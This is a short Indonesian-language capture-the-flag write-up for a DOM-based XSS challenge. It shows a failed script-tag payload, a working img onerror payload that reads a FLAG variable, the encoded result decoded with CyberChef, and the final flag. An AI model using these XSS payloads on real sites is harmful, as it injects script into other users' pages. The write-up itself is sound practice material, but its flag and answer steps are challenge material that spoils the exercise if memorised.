# DOM-Based XSS
## soal
-

## solve
- disini terdapat soal xss dom nah pertama tama saya mencoba payload simple seperti ```<script>alert{'test'}</script``` namun tidak berhasil
- lalu saya mencoba payload ```<img src="p" onerror="alert('test')">``` ini berhasil
- lalu saya mencoba lagi dengan nama variable FLAG dengan menggunakan payload ```<img src="p" onerror="alert(FLAG)">```
  ![alt text](<images/DOM-Based XSS/image.png>)
  ```bash
  27oFx9NE945YFuBYFshct2G4Mi3hmKpS7UTWS87yKMn
  ```
- lalu saya mencoba mendecode dengan cyber chef dengan recipe **Magic** dan berhasil mendapatkan flagnya
  ![alt text](<images/DOM-Based XSS/image-1.png>)

## flag
IDN_CTF{dom_based_xss_executed}